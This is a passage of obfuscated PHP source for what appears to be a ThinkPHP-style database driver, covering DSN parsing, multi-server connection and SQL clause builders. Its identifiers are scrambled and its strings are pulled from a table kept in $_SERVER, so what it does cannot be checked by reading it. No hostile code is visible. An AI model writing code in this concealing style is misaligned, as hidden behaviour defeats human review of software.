$˜„Ëö­¹[21] => $İ Èûİå[$˜„Ëö­¹[1088]], $˜„Ëö­¹[1032] => $İ Èûİå[$˜„Ëö­¹[1089]], $˜„Ëö­¹[17] => isset($İ Èûİå[$˜„Ëö­¹[1090]]) ? $İ Èûİå[$˜„Ëö­¹[1090]] : array()); } elseif (empty($İ Èûİå)) { if (think_config($˜„Ëö­¹[1091]) && $˜„Ëö­¹[1080] != strtolower(think_config($˜„Ëö­¹[1092]))) { $İ Èûİå = $this->parseDSN(think_config($˜„Ëö­¹[1091])); } else { $İ Èûİå = array($˜„Ëö­¹[1077] => think_config($˜„Ëö­¹[1092]), $˜„Ëö­¹[1001] => think_config($˜„Ëö­¹[1093]), $˜„Ëö­¹[1002] => think_config($˜„Ëö­¹[1094]), $˜„Ëö­¹[999] => think_config($˜„Ëö­¹[1095]), $˜„Ëö­¹[1000] => think_config($˜„Ëö­¹[1096]), $˜„Ëö­¹[21] => think_config($˜„Ëö­¹[335]), $˜„Ëö­¹[1032] => think_config($˜„Ëö­¹[1091]), $˜„Ëö­¹[17] => think_config($˜„Ëö­¹[1097])); } } return $İ Èûİå; } protected function initConnect($Œšœ‡ÖÂ = true) { if (1 == think_config($_SERVER[¤øïŠ‹²][22])) { $this->_linkID = $this->multiConnect($Œšœ‡ÖÂ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $›ÇÇã© => $ˆÔÒå”¯) { $this->_linkID = $ˆÔÒå”¯; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($¼œìç‘ = false) { $¹¯¸Úå =& $_SERVER[¤øïŠ‹²]; static $ã¥¹ŞÃì = array(); static $†‹İ ûÉ = -1; if (empty($ã¥¹ŞÃì)) { foreach ($this->config as $–±íá•± => $‰ÈâŠ¬í) { $ã¥¹ŞÃì[$–±íá•±] = explode($¹¯¸Úå[50], $‰ÈâŠ¬í); } } if (think_config($¹¯¸Úå[1098])) { if ($¼œìç‘ || think_config($¹¯¸Úå[492]) === !0) { $ãÈÛÁİ = floor(mt_rand(0, think_config($¹¯¸Úå[1099]) - 1)); $†‹İ ûÉ = $ãÈÛÁİ; } else { if (is_numeric(think_config($¹¯¸Úå[1100]))) { $ãÈÛÁİ = think_config($¹¯¸Úå[1100]); } else { $ãÈÛÁİ = floor(mt_rand(think_config($¹¯¸Úå[1099]), count($ã¥¹ŞÃì[$¹¯¸Úå[999]]) - 1)); } } } else { $ãÈÛÁİ = floor(mt_rand(0, count($ã¥¹ŞÃì[$¹¯¸Úå[999]]) - 1)); $†‹İ ûÉ = $ãÈÛÁİ; } $ãÈÛÁİ = $†‹İ ûÉ !== -1 ? $†‹İ ûÉ : $ãÈÛÁİ; $šÙªøÎÃ = array($¹¯¸Úå[1001] => isset($ã¥¹ŞÃì[$¹¯¸Úå[1001]][$ãÈÛÁİ]) ? $ã¥¹ŞÃì[$¹¯¸Úå[1001]][$ãÈÛÁİ] : $ã¥¹ŞÃì[$¹¯¸Úå[1001]][0], $¹¯¸Úå[1002] => isset($ã¥¹ŞÃì[$¹¯¸Úå[1002]][$ãÈÛÁİ]) ? $ã¥¹ŞÃì[$¹¯¸Úå[1002]][$ãÈÛÁİ] : $ã¥¹ŞÃì[$¹¯¸Úå[1002]][0], $¹¯¸Úå[999] => isset($ã¥¹ŞÃì[$¹¯¸Úå[999]][$ãÈÛÁİ]) ? $ã¥¹ŞÃì[$¹¯¸Úå[999]][$ãÈÛÁİ] : $ã¥¹ŞÃì[$¹¯¸Úå[999]][0], $¹¯¸Úå[1000] => isset($ã¥¹ŞÃì[$¹¯¸Úå[1000]][$ãÈÛÁİ]) ? $ã¥¹ŞÃì[$¹¯¸Úå[1000]][$ãÈÛÁİ] : $ã¥¹ŞÃì[$¹¯¸Úå[1000]][0], $¹¯¸Úå[21] => isset($ã¥¹ŞÃì[$¹¯¸Úå[21]][$ãÈÛÁİ]) ? $ã¥¹ŞÃì[$¹¯¸Úå[21]][$ãÈÛÁİ] : $ã¥¹ŞÃì[$¹¯¸Úå[21]][0], $¹¯¸Úå[1032] => isset($ã¥¹ŞÃì[$¹¯¸Úå[1032]][$ãÈÛÁİ]) ? $ã¥¹ŞÃì[$¹¯¸Úå[1032]][$ãÈÛÁİ] : $ã¥¹ŞÃì[$¹¯¸Úå[1032]][0], $¹¯¸Úå[17] => isset($ã¥¹ŞÃì[$¹¯¸Úå[17]][$ãÈÛÁİ]) ? $ã¥¹ŞÃì[$¹¯¸Úå[17]][$ãÈÛÁİ] : $ã¥¹ŞÃì[$¹¯¸Úå[17]][0]); return $this->connect($šÙªøÎÃ, $ãÈÛÁİ); } public function parseDSN($›é©¶Øš) { $¢Ë›œƒÃ =& $_SERVER[¤øïŠ‹²]; if (empty($›é©¶Øš)) { return !1; } $¸ßƒÁœ” = parse_url($›é©¶Øš); if ($¸ßƒÁœ”[$¢Ë›œƒÃ[218]]) { $ıè‰éŠ€ = array($¢Ë›œƒÃ[1077] => $¸ßƒÁœ”[$¢Ë›œƒÃ[218]], $¢Ë›œƒÃ[1001] => isset($¸ßƒÁœ”[$¢Ë›œƒÃ[691]]) ? $¸ßƒÁœ”[$¢Ë›œƒÃ[691]] : $¢Ë›œƒÃ[12], $¢Ë›œƒÃ[1002] => isset($¸ßƒÁœ”[$¢Ë›œƒÃ[1101]]) ? $¸ßƒÁœ”[$¢Ë›œƒÃ[1101]] : $¢Ë›œƒÃ[12], $¢Ë›œƒÃ[999] => isset($¸ßƒÁœ”[$¢Ë›œƒÃ[219]]) ? $¸ßƒÁœ”[$¢Ë›œƒÃ[219]] : $¢Ë›œƒÃ[12], $¢Ë›œƒÃ[1000] => isset($¸ßƒÁœ”[$¢Ë›œƒÃ[220]]) ? $¸ßƒÁœ”[$¢Ë›œƒÃ[220]] : $¢Ë›œƒÃ[12], $¢Ë›œƒÃ[21] => isset($¸ßƒÁœ”[$¢Ë›œƒÃ[98]]) ? substr($¸ßƒÁœ”[$¢Ë›œƒÃ[98]], 1) : $¢Ë›œƒÃ[12]); } else { preg_match($¢Ë›œƒÃ[1102], trim($›é©¶Øš), $ËßŞ¦†•); $ıè‰éŠ€ = array($¢Ë›œƒÃ[1077] => $ËßŞ¦†•[1], $¢Ë›œƒÃ[1001] => $ËßŞ¦†•[2], $¢Ë›œƒÃ[1002] => $ËßŞ¦†•[3], $¢Ë›œƒÃ[999] => $ËßŞ¦†•[4], $¢Ë›œƒÃ[1000] => $ËßŞ¦†•[5], $¢Ë›œƒÃ[21] => $ËßŞ¦†•[6]); } $ıè‰éŠ€[$¢Ë›œƒÃ[1032]] = $¢Ë›œƒÃ[12]; return $ıè‰éŠ€; } protected function debug() { $‡ŸŞ¦¨ =& $_SERVER[¤øïŠ‹²]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $‡ŸŞ¦¨[1103]; if (think_config($‡ŸŞ¦¨[1104])) { think_status($‡ŸŞ¦¨[1105]); think_trace($this->queryStr . $‡ŸŞ¦¨[1106] . think_status($‡ŸŞ¦¨[24], $‡ŸŞ¦¨[1105], 6) . $‡ŸŞ¦¨[1107], $‡ŸŞ¦¨[12], $‡ŸŞ¦¨[1108]); } } protected function parseLock($ªØ¦İøÖ = false) { $’¥©øîß =& $_SERVER[¤øïŠ‹²]; if (!$ªØ¦İøÖ) { return $’¥©øîß[12]; } if ($’¥©øîß[1034] == $this->dbType) { return $’¥©øîß[1109]; } return $’¥©øîß[1110]; } protected function parseSet($÷Ê•×¾¯) { $´’•¶©µ =& $_SERVER[¤øïŠ‹²]; foreach ($÷Ê•×¾¯ as $£ÅÁùƒ => $óãŠÒ¬İ) { if (is_array($óãŠÒ¬İ) && $´’•¶©µ[384] == $óãŠÒ¬İ[0]) { $Ì° ùá[] = $this->parseKey($£ÅÁùƒ) . $´’•¶©µ[474] . $óãŠÒ¬İ[1]; } elseif (is_scalar($óãŠÒ¬İ) || is_null($óãŠÒ¬İ)) { $Ì° ùá[] = $this->parseKey($£ÅÁùƒ) . $´’•¶©µ[474] . $this->parseValue($óãŠÒ¬İ); } } return $´’•¶©µ[1111] . implode($´’•¶©µ[50], $Ì° ùá); } protected function bindParam($€‰äâè«, $¼™ßÀ­·) { $this->bind[$_SERVER[¤øïŠ‹²][4] . $€‰äâè«] = $¼™ßÀ­·; } protected function parseBind($ŞËƒª§) { $ŞËƒª§ = array_merge($this->bind, $ŞËƒª§); $this->bind = array(); return $ŞËƒª§; } function parseKey(&$ß‹îçèÓ, $ß±ğ˜àû = true) { if ($ß±ğ˜àû) { $ß‹îçèÓ = $this->parseKeyCheck($ß‹îçèÓ); } return $ß‹îçèÓ; } function parseKeyCheck($ß½Ø½Ñ) { $çš‘»Î´ =& $_SERVER[¤øïŠ‹²]; $ß½Ø½Ñ = trim($ß½Ø½Ñ); if (!preg_match($çš‘»Î´[1112], $ß½Ø½Ñ)) { think_exception($çš‘»Î´[1113] . $ß½Ø½Ñ); } return $ß½Ø½Ñ; } protected function parseValue($¾ı­œè) { $±¥òÜ‹Ê =& $_SERVER[¤øïŠ‹²]; if (is_string($¾ı­œè)) { $¾ı­œè = $±¥òÜ‹Ê[1073] . $this->escapeString($¾ı­œè) . $±¥òÜ‹Ê[1073]; } elseif (isset($¾ı­œè[0]) && is_string($¾ı­œè[0]) && strtolower($¾ı­œè[0]) == $±¥òÜ‹Ê[384]) { $¾ı­œè = $this->escapeString($¾ı­œè[1]); } elseif (is_array($¾ı­œè)) { $¾ı­œè = array_map(array($this, $±¥òÜ‹Ê[1074]), $¾ı­œè); } elseif (is_bool($¾ı­œè)) { $¾ı­œè = $¾ı­œè ? $±¥òÜ‹Ê[102] : $±¥òÜ‹Ê[241]; } elseif (is_null($¾ı­œè)) { $¾ı­œè = $±¥òÜ‹Ê[115]; } return $¾ı­œè; } protected function parseField($œÛ¸¡‚Ë) { $àÌçï£â =& $_SERVER[¤øïŠ‹²]; if (is_string($œÛ¸¡‚Ë) && strpos($œÛ¸¡‚Ë, $àÌçï£â[50])) { $œÛ¸¡‚Ë = explode($àÌçï£â[50], $œÛ¸¡‚Ë); } if (is_array($œÛ¸¡‚Ë)) { $÷¥Ğ¿èÜ = array(); foreach ($œÛ¸¡‚Ë as $Î¥ÈŸÑÚ => $ûÆø•ÉÔ) { if (!is_numeric($Î¥ÈŸÑÚ)) { $÷¥Ğ¿èÜ[] = $this->parseKey($Î¥ÈŸÑÚ, !1) . $àÌçï£â[1114] . $this->parseKey($ûÆø•ÉÔ); } else { $÷¥Ğ¿èÜ[] = $this->parseKey($ûÆø•ÉÔ); } } $…·îòæ = implode($àÌçï£â[50], $÷¥Ğ¿èÜ); } elseif (is_string($œÛ¸¡‚Ë) && !empty($œÛ¸¡‚Ë)) { $…·îòæ = $œÛ¸¡‚Ë; } else { $…·îòæ = $àÌçï£â[233]; } return $…·îòæ; } protected function parseTable($Ã„‚˜—) { $Ì„ÂÁâ =& $_SERVER[¤øïŠ‹²]; if (is_array($Ã„‚˜—)) { $¼¾«ñ’Ê = array(); foreach ($Ã„‚˜— as $°éªêÕñ => $½†«íÌŠ) { if (!is_numeric($°éªêÕñ)) { $¼¾«ñ’Ê[] = $this->parseKey($°éªêÕñ) . $Ì„ÂÁâ[53] . $this->parseKey($½†«íÌŠ); } else { $¼¾«ñ’Ê[] = $this->parseKey($°éªêÕñ); } } $Ã„‚˜— = $¼¾«ñ’Ê; } elseif (is_string($Ã„‚˜—)) { if (strstr($Ã„‚˜—, $Ì„ÂÁâ[53])) { return $Ã„‚˜—; } $Ã„‚˜— = explode($Ì„ÂÁâ[50], $Ã„‚˜—); array_walk($Ã„‚˜—, array($this, $Ì„ÂÁâ[1019])); } return $Ì„ÂÁâ[1013] . trim(implode($Ì„ÂÁâ[1115], $Ã„‚˜—), $Ì„ÂÁâ[482]) . $Ì„ÂÁâ[1013]; } protected function parseWhere($Ş×¸á´œ) { $Ä‹ˆ¨Ë¥ =& $_SERVER[¤øïŠ‹²]; $ÑÊ’¶‡¬ = $Ä‹ˆ¨Ë¥[12]; if (is_string($Ş×¸á´œ)) { $ÑÊ’¶‡¬ = $Ş×¸á´œ; } else { $‰€Š«Ê = isset($Ş×¸á´œ[$Ä‹ˆ¨Ë¥[1116]]) ? strtoupper($Ş×¸á´œ[$Ä‹ˆ¨Ë¥[1116]]) : $Ä‹ˆ¨Ë¥[12]; if (in_array($‰€Š«Ê, array($Ä‹ˆ¨Ë¥[1117], $Ä‹ˆ¨Ë¥[1118], $Ä‹ˆ¨Ë¥[1119]))) { $‰€Š«Ê = $Ä‹ˆ¨Ë¥[53] . $‰€Š«Ê . $Ä‹ˆ¨Ë¥[53]; unset($Ş×¸á´œ[$Ä‹ˆ¨Ë¥[1116]]); } else { $‰€Š«Ê = $Ä‹ˆ¨Ë¥[1120]; } foreach ($Ş×¸á´œ as $®÷ŒƒŞ¬ => $ŠÓ†×Ÿ¹) { $ÑÊ’¶‡¬ .= $Ä‹ˆ¨Ë¥[367]; if (is_numeric($®÷ŒƒŞ¬)) { $®÷ŒƒŞ¬ = $Ä‹ˆ¨Ë¥[1121]; } if (0 === strpos($®÷ŒƒŞ¬, $Ä‹ˆ¨Ë¥[11])) { $ÑÊ’¶‡¬ .= $this->parseThinkWhere($®÷ŒƒŞ¬, $ŠÓ†×Ÿ¹); } else { if (!preg_match($Ä‹ˆ¨Ë¥[1122], trim($®÷ŒƒŞ¬))) { think_exception(think_lang($Ä‹ˆ¨Ë¥[1123]) . $Ä‹ˆ¨Ë¥[4] . $®÷ŒƒŞ¬); } $Ü†ãÑ“‚ = is_array($ŠÓ†×Ÿ¹) && isset($ŠÓ†×Ÿ¹[$Ä‹ˆ¨Ë¥[1124]]); $®÷ŒƒŞ¬ = trim($®÷ŒƒŞ¬); if (strpos($®÷ŒƒŞ¬, $Ä‹ˆ¨Ë¥[225])) { $äÖØÔØî = explode($Ä‹ˆ¨Ë¥[225], $®÷ŒƒŞ¬); $¾‡±¬íØ = array(); foreach ($äÖØÔØî as $ğµ®ô => $÷èŒìã¸) { $®ıú’Ìº = $Ü†ãÑ“‚ ? $ŠÓ†×Ÿ¹[$ğµ®ô] : $ŠÓ†×Ÿ¹; $¾‡±¬íØ[] = $Ä‹ˆ¨Ë¥[349] . $this->parseWhereItem($this->parseKey($÷èŒìã¸), $®ıú’Ìº) . $Ä‹ˆ¨Ë¥[1018]; } $ÑÊ’¶‡¬ .= implode($Ä‹ˆ¨Ë¥[1125], $¾‡±¬íØ); } elseif (strpos($®÷ŒƒŞ¬, $Ä‹ˆ¨Ë¥[297])) { $äÖØÔØî = explode($Ä‹ˆ¨Ë¥[297], $®÷ŒƒŞ¬); $¾‡±¬íØ = array(); foreach ($äÖØÔØî as $ğµ®ô => $÷èŒìã¸) { $®ıú’Ìº = $Ü†ãÑ“‚ ? $ŠÓ†×Ÿ¹[$ğµ®ô] : $ŠÓ†×Ÿ¹; $¾‡±¬íØ[] = $Ä‹ˆ¨Ë¥[349] . $this->parseWhereItem($this->parseKey($÷èŒìã¸), $®ıú’Ìº) . $Ä‹ˆ¨Ë¥[1018]; } $ÑÊ’¶‡¬ .= implode($Ä‹ˆ¨Ë¥[1120], $¾‡±¬íØ); } else { $ÑÊ’¶‡¬ .= $this->parseWhereItem($this->parseKey($®÷ŒƒŞ¬), $ŠÓ†×Ÿ¹); } } $ÑÊ’¶‡¬ .= $Ä‹ˆ¨Ë¥[368] . $‰€Š«Ê; } $ÑÊ’¶‡¬ = substr($ÑÊ’¶‡¬, 0, -strlen($‰€Š«Ê)); } return empty($ÑÊ’¶‡¬) ? $Ä‹ˆ¨Ë¥[12] : $Ä‹ˆ¨Ë¥[1126] . $ÑÊ’¶‡¬; } protected function parseWhereItem($ŞâĞÃŞ, $Å‘ÈÜØò) { $·Ãüš²¥ =& $_SERVER[¤øïŠ‹²]; $ãÇ÷³Æı = $·Ãüš²¥[12]; if (is_array($Å‘ÈÜØò)) { if (is_string($Å‘ÈÜØò[0])) { $Òˆ¥¡± = strtolower($Å‘ÈÜØò[0]); if (in_array($Å‘ÈÜØò[0], array($·Ãüš²¥[474], $·Ãüš²¥[1127], $·Ãüš²¥[1128], $·Ãüš²¥[1129], $·Ãüš²¥[1130], $·Ãüš²¥[1131]))) { $ãÇ÷³Æı .= $ŞâĞÃŞ . $·Ãüš²¥[53] . $Å‘ÈÜØò[0] . $·Ãüš²¥[53] . $this->parseValue($Å‘ÈÜØò[1]); } elseif (preg_match($·Ãüš²¥[1132], $Å‘ÈÜØò[0])) { $ãÇ÷³Æı .= $ŞâĞÃŞ . $·Ãüš²¥[53] . $this->exp[$Òˆ¥¡±] . $·Ãüš²¥[53] . $this->parseValue($Å‘ÈÜØò[1]); } elseif (preg_match($·Ãüš²¥[1133], $Å‘ÈÜØò[0])) { if (is_array($Å‘ÈÜØò[1])) { $òŸ“é = isset($Å‘ÈÜØò[2]) ? strtoupper($Å‘ÈÜØò[2]) : $·Ãüš²¥[1118]; if (in_array($òŸ“é, array($·Ãüš²¥[1117], $·Ãüš²¥[1118], $·Ãüš²¥[1119]))) { $ÅÁæ¬¨Õ = array(); foreach ($Å‘ÈÜØò[1] as $¡€ ™ì) { $ÅÁæ¬¨Õ[] = $ŞâĞÃŞ . $·Ãüš²¥[53] . $this->exp[$Òˆ¥¡±] . $·Ãüš²¥[53] . $this->parseValue($¡€ ™ì); } $ãÇ÷³Æı .= $·Ãüš²¥[349] . implode($·Ãüš²¥[53] . $òŸ“é . $·Ãüš²¥[53], $ÅÁæ¬¨Õ) . $·Ãüš²¥[1018]; } } else { $ãÇ÷³Æı .= $ŞâĞÃŞ . $·Ãüš²¥[53] . $this->exp[$Òˆ¥¡±] . $·Ãüš²¥[53] . $this->parseValue($Å‘ÈÜØò[1]); } } elseif ($·Ãüš²¥[384] == $Òˆ¥¡±) { $ãÇ÷³Æı .= $·Ãüš²¥[1016] . $ŞâĞÃŞ . $·Ãüš²¥[53] . $Å‘ÈÜØò[1] . $·Ãüš²¥[1134]; } elseif (preg_match($·Ãüš²¥[1135], $Å‘ÈÜØò[0])) { $ãÇ÷³Æı .= $Å‘ÈÜØò[0]; } elseif (preg_match($·Ãüš²¥[1136], $Å‘ÈÜØò[0])) { if (isset($Å‘ÈÜØò[2]) && $·Ãüš²¥[384] == $Å‘ÈÜØò[2]) { $ãÇ÷³Æı .= $ŞâĞÃŞ . $·Ãüš²¥[53] . $this->exp[$Òˆ¥¡±] . $·Ãüš²¥[53] . $Å‘ÈÜØò[1]; } else { if (is_string($Å‘ÈÜØò[1])) { $Å‘ÈÜØò[1] = explode($·Ãüš²¥[50], $Å‘ÈÜØò[1]); } $¶ÜßäÁ = implode($·Ãüš²¥[50], $this->parseValue($Å‘ÈÜØò[1])); $ãÇ÷³Æı .= $ŞâĞÃŞ . $·Ãüš²¥[53] . $this->exp[$Òˆ¥¡±] . $·Ãüš²¥[1016] . $¶ÜßäÁ . $·Ãüš²¥[1018]; } } elseif (preg_match($·Ãüš²¥[1137], $Å‘ÈÜØò[0])) { $¬’ì–Ê = is_string($Å‘ÈÜØò[1]) ? explode($·Ãüš²¥[50], $Å‘ÈÜØò[1]) : $Å‘ÈÜØò[1]; $ãÇ÷³Æı .= $·Ãüš²¥[1016] . $ŞâĞÃŞ . $·Ãüš²¥[53] . $this->exp[$Òˆ¥¡±] . $·Ãüš²¥[53] . $this->parseValue($¬’ì–Ê[0]) . $·Ãüš²¥[1120] . $this->parseValue($¬’ì–Ê[1]) . $·Ãüš²¥[368]; } else { think_exception(think_lang($·Ãüš²¥[1123]) . $·Ãüš²¥[4] . $Å‘ÈÜØò[0]); } } else { $œô„§ó = count($Å‘ÈÜØò); $ÍÊ¢š×’ = $·Ãüš²¥[12]; if (is_string($Å‘ÈÜØò[$œô„§ó - 1])) { $ÍÊ¢š×’ = isset($Å‘ÈÜØò[$œô„§ó - 1]) ? strtoupper($Å‘ÈÜØò[$œô„§ó - 1]) : $·Ãüš²¥[12]; if (in_array($ÍÊ¢š×’, array($·Ãüš²¥[1117], $·Ãüš²¥[1118], $·Ãüš²¥[1119]))) { $œô„§ó = $œô„§ó - 1; } } else { $ÍÊ¢š×’ = $·Ãüš²¥[1117]; } for ($‘äÃ‚˜â = 0; $‘äÃ‚˜â < $œô„§ó; $‘äÃ‚˜â++) { $¬’ì–Ê = is_array($Å‘ÈÜØò[$‘äÃ‚˜â]) ? $Å‘ÈÜØò[$‘äÃ‚˜â][1] : $Å‘ÈÜØò[$‘äÃ‚˜â]; if ($·Ãüš²¥[384] == strtolower($Å‘ÈÜØò[$‘äÃ‚˜â][0])) { $ãÇ÷³Æı .= $·Ãüš²¥[349] . $ŞâĞÃŞ . $·Ãüš²¥[53] . $¬’ì–Ê . $·Ãüš²¥[1134] . $ÍÊ¢š×’ . $·Ãüš²¥[53]; } else { $™¨”Ö²Ğ = is_array($Å‘ÈÜØò[$‘äÃ‚˜â]) ? $this->exp[strtolower($Å‘ÈÜØò[$‘äÃ‚˜â][0])] : $·Ãüš²¥[474]; if (!$™¨”Ö²Ğ && is_array($Å‘ÈÜØò[$‘äÃ‚˜â]) && in_array($Å‘ÈÜØò[$‘äÃ‚˜â][0], array($·Ãüš²¥[474], $·Ãüš²¥[1127], $·Ãüš²¥[1128], $·Ãüš²¥[1129], $·Ãüš²¥[1130], $·Ãüš²¥[1131]))) { $™¨”Ö²Ğ = $Å‘ÈÜØò[$‘äÃ‚˜â][0]; } $ãÇ÷³Æı .= $·Ãüš²¥[349] . $ŞâĞÃŞ . $·Ãüš²¥[53] . $™¨”Ö²Ğ . $·Ãüš²¥[53] . $this->parseValue($¬’ì–Ê) . $·Ãüš²¥[1134] . $ÍÊ¢š×’ . $·Ãüš²¥[53]; } } $ãÇ÷³Æı = substr($ãÇ÷³Æı, 0, -4); } } else { $ãÇ÷³Æı .= $ŞâĞÃŞ . $·Ãüš²¥[1138] . $this->parseValue($Å‘ÈÜØò); } return $ãÇ÷³Æı; } protected function parseThinkWhere($ëãïÈØ÷, $Â êÛñ”) { $ëç°Ğ† =& $_SERVER[¤øïŠ‹²]; $ƒÇŒˆÃæ = $ëç°Ğ†[12]; switch ($ëãïÈØ÷) { case $ëç°Ğ†[439]: $ƒÇŒˆÃæ = $Â êÛñ”; break; case $ëç°Ğ†[1121]: $ƒÇŒˆÃæ = is_string($Â êÛñ”) ? $Â êÛñ” : substr($this->parseWhere($Â êÛñ”), 6); break; case $ëç°Ğ†[1139]: parse_str($Â êÛñ”, $“åå±ç); if (isset($“åå±ç[$ëç°Ğ†[1116]])) { $úğ–£µı = $ëç°Ğ†[53] . strtoupper($“åå±ç[$ëç°Ğ†[1116]]) . $ëç°Ğ†[53]; unset($“åå±ç[$ëç°Ğ†[1116]]); } else { $úğ–£µı = $ëç°Ğ†[1120]; } $å—½ÀÔ„ = array(); foreach ($“åå±ç as $Šê…ô—ú => $ê÷Î×ôş) { $å—½ÀÔ„[] = $this->parseKey($Šê…ô—ú) . $ëç°Ğ†[1138] . $this->parseValue($ê÷Î×ôş); } $ƒÇŒˆÃæ = implode($úğ–£µı, $å—½ÀÔ„); break; } return $ƒÇŒˆÃæ; } protected function parseLimit($¨¡­ñóŞ) { $·»’¦†Ì =& $_SERVER[¤øïŠ‹²]; return !empty($¨¡­ñóŞ) ? $·»’¦†Ì[51] . $¨¡­ñóŞ . $·»’¦†Ì[53] : $·»’¦†Ì[12]; } protected function parseJoin($Òş–¬ªú) { $¦‡×¶è =& $_SERVER[¤øïŠ‹²]; $‘³—µÆ¡ = $¦‡×¶è[12]; if (!empty($Òş–¬ªú)) { if (is_array($Òş–¬ªú)) { foreach ($Òş–¬ªú as $Ãáæ€ñ => $ˆù•Öé¢) { if (!1 !== stripos($ˆù•Öé¢, $¦‡×¶è[1140])) { $‘³—µÆ¡ .= $¦‡×¶è[53] . $ˆù•Öé¢; } else { $‘³—µÆ¡ .= $¦‡×¶è[1141] . $ˆù•Öé¢; } } } else { $‘³—µÆ¡ .= $¦‡×¶è[1141] . $Òş–¬ªú; } } $‘³—µÆ¡ = preg_replace($¦‡×¶è[1142], think_config($¦‡×¶è[1046]) . $¦‡×¶è[1143], $‘³—µÆ¡); return $‘³—µÆ¡; } protected function parseOrder($ğ»Ò°¼á) { $¥íšíÑ =& $_SERVER[¤øïŠ‹²]; if (is_array($ğ»Ò°¼á)) { $’æ²ñµÕ = array(); foreach ($ğ»Ò°¼á as $»×£Òøë => $İ¾óñë¶) { if (is_numeric($»×£Òøë)) { $’æ²ñµÕ[] = $this->parseKey($İ¾óñë¶); } else { $İ¾óñë¶ = in_array(strtoupper(trim($İ¾óñë¶)), array($¥íšíÑ[1144], $¥íšíÑ[1145])) ? $¥íšíÑ[53] . $İ¾óñë¶ : $¥íšíÑ[12]; if (preg_match($¥íšíÑ[1146], $»×£Òøë)) { $’æ²ñµÕ[] = $this->parseKey($»×£Òøë) . $İ¾óñë¶; } else { think_exception($¥íšíÑ[1147] . $»×£Òøë); } } } $ğ»Ò°¼á = implode($¥íšíÑ[50], $’æ²ñµÕ); } return !empty($ğ»Ò°¼á) ? $¥íšíÑ[1148] . $ğ»Ò°¼á : $¥íšíÑ[12]; } protected function parseGroup($’âÎê‚¹) { $âı©Œ™ =& $_SERVER[¤øïŠ‹²]; return !empty($’âÎê‚¹) ? $âı©Œ™[1149] . $’âÎê‚¹ : $âı©Œ™[12]; } protected function parseHaving($™Ğ×Ã°§) { $ó´öıÃ½ =& $_SERVER[¤øïŠ‹²]; return !empty($™Ğ×Ã°§) ? $ó´öıÃ½[1150] . $™Ğ×Ã°§ : $ó´öıÃ½[12]; } protected function parseComment($èÇ¿Àñ) { $ìõğÅ ç =& $_SERVER[¤øïŠ‹²]; return !empty($èÇ¿Àñ) ? $ìõğÅ ç[1151] . $èÇ¿Àñ . $ìõğÅ ç[1152] : $ìõğÅ ç[12]; } protected function parseDistinct($œá•…ë) { $ÛœÅÊã =& $_SERVER[¤øïŠ‹²]; return !empty($œá•…ë) ? $ÛœÅÊã[1153] : $ÛœÅÊã[12]; } protected function parseUnion($¦Í½œ¼) { $‰ü¹áï• =& $_SERVER[¤øïŠ‹²]; if (empty($¦Í½œ¼)) { return $‰ü¹áï•[12]; } if (isset($¦Í½œ¼[$‰ü¹áï•[435]])) { $­Ëß¢Ú‡ = $‰ü¹áï•[1154]; unset($¦Í½œ¼[$‰ü¹áï•[435]]); } else { $­Ëß¢Ú‡ = $‰ü¹áï•[1155]; } foreach ($¦Í½œ¼ as $˜îêñÁƒ) { $±ÒË­[] = $­Ëß¢Ú‡ . (is_array($˜îêñÁƒ) ? $this->buildSelectSql($˜îêñÁƒ) : $˜îêñÁƒ); } return implode($‰ü¹áï•[53], $±ÒË­); } public function insert($–ºÀ­©¼, $˜´İ¹» = array(), $ƒˆé‡ë† = false) { $Ü±üİâ¥ =& $_SERVER[¤øïŠ‹²]; $ê·ø¦¡é = $Úê–ó·ò = array(); $this->model = $˜´İ¹»[$Ü±üİâ¥[371]]; foreach ($–ºÀ­©¼ as $“˜Ú²´© => $ü«Ë¸¾¨) { if (is_array($ü«Ë¸¾¨) && $Ü±üİâ¥[384] == $ü«Ë¸¾¨[0]) { $Úê–ó·ò[] = $this->parseKey($“˜Ú²´©); $ê·ø¦¡é[] = $ü«Ë¸¾¨[1]; } elseif (is_scalar($ü«Ë¸¾¨) || is_null($ü«Ë¸¾¨)) { $Úê–ó·ò[] = $this->parseKey($“˜Ú²´©); $ê·ø¦¡é[] = $this->parseValue($ü«Ë¸¾¨); } } $óÆ‚ÙÌğ = ($ƒˆé‡ë† ? $Ü±üİâ¥[1020] : $Ü±üİâ¥[1021]) . $Ü±üİâ¥[1022] . $this->parseTable($˜´İ¹»[$Ü±üİâ¥[369]]) . $Ü±üİâ¥[1016] . implode($Ü±üİâ¥[50], $Úê–ó·ò) . $Ü±üİâ¥[1017] . implode($Ü±üİâ¥[50], $ê·ø¦¡é) . $Ü±üİâ¥[1018]; $óÆ‚ÙÌğ .= $this->parseLock(isset($˜´İ¹»[$Ü±üİâ¥[956]]) ? $˜´İ¹»[$Ü±üİâ¥[956]] : !1); $óÆ‚ÙÌğ .= $this->parseComment(!empty($˜´İ¹»[$Ü±üİâ¥[441]]) ? $˜´İ¹»[$Ü±üİâ¥[441]] : $Ü±üİâ¥[12]); return $this->execute($óÆ‚ÙÌğ, $this->parseBind(!empty($˜´İ¹»[$Ü±üİâ¥[373]]) ? $˜´İ¹»[$Ü±üİâ¥[373]] : array())); } public function selectInsert($†“Şëà©, $©¡×ò¥, $şè˜å®Ø = array()) { $úä«ıòê =& $_SERVER[¤øïŠ‹²]; $this->model = $şè˜å®Ø[$úä«ıòê[371]]; if (is_string($†“Şëà©)) { $†“Şëà© = explode($úä«ıòê[50], $†“Şëà©); } array_walk($†“Şëà©, array($this, $úä«ıòê[1019])); $Ø¯Åæ = $úä«ıòê[1156] . $this->parseTable($©¡×ò¥) . $úä«ıòê[1016] . implode($úä«ıòê[50], $†“Şëà©) . $úä«ıòê[1134]; $Ø¯Åæ .= $this->buildSelectSql($şè˜å®Ø); return $this->execute($Ø¯Åæ, $this->parseBind(!empty($şè˜å®Ø[$úä«ıòê[373]]) ? $şè˜å®Ø[$úä«ıòê[373]] : array())); } public function update($‘ùÔßºÉ, $íÊÄî§) { $±ıé¿ïÅ =& $_SERVER[¤øïŠ‹²]; $this->model = $íÊÄî§[$±ıé¿ïÅ[371]]; $ĞŞüÚ´î = $±ıé¿ïÅ[1157] . $this->parseTable($íÊÄî§[$±ıé¿ïÅ[369]]) . 